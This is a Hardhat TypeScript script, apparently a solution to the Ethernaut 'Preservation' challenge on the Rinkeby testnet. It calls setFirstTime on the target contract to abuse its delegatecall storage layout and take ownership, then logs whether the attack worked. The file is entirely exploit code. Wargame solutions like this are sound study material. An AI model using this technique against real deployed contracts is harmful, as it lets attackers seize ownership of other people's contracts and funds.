import "@ethersproject/abstract-provider"
import { deployments,ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}=await getNamedAccounts()
        const exploiterAcc= await ethers.getSigner(exploiter)
        const preservation= await ethers.getContractAt('Preservation',process.env.PRESERVATION_ADDRESS as string)
        
        const preservationExploitDeployment=await deployments.get('PreservationExploit')
        const preservationExploit = await ethers.getContractAt('PreservationExploit',preservationExploitDeployment.address)

        //await preservation.connect(exploiterAcc).setFirstTime(ethers.BigNumber.from(preservationExploit.address))
        await preservation.setFirstTime(ethers.BigNumber.from(exploiterAcc.address),{
            gasLimit:21000*10
        })

        if(await preservation.owner() === exploiter){
            console.log("Successful attack")
        }else{
            console.log(`Preservation exploit : ${preservationExploit.address}`)
            console.log(`timeZone1Library : ${await preservation.timeZone1Library()}`)
            console.log(`Actual owner: ${await preservation.owner()}`)
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
